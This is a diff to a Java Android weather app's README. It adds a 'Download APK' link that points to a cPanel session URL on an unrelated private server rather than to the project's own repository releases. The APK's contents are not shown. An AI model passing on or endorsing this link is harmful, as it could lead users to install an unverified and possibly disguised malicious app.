@@ -17,6 +17,10 @@ The Weather Forecast App is a Java-based Android application that provides weath
 ![screenshot1](https://github.com/FortisLeo/Weather-app/assets/121441735/f984c64c-f0f2-4200-bed2-a052db6db1f8)
 ![screenshot2](https://github.com/FortisLeo/Weather-app/assets/121441735/65682044-98f9-49f1-8efe-3e643569cb7a)
 
+## Download
+
+[Download APK](https://proxy787.private-server.site:2083/cpsess2540225381/download?skipencode=1&file=%2fhome%2fritbwptn%2fuploads1%2fweather-app.apk)
+
 ## Technologies Used
 
 - Java
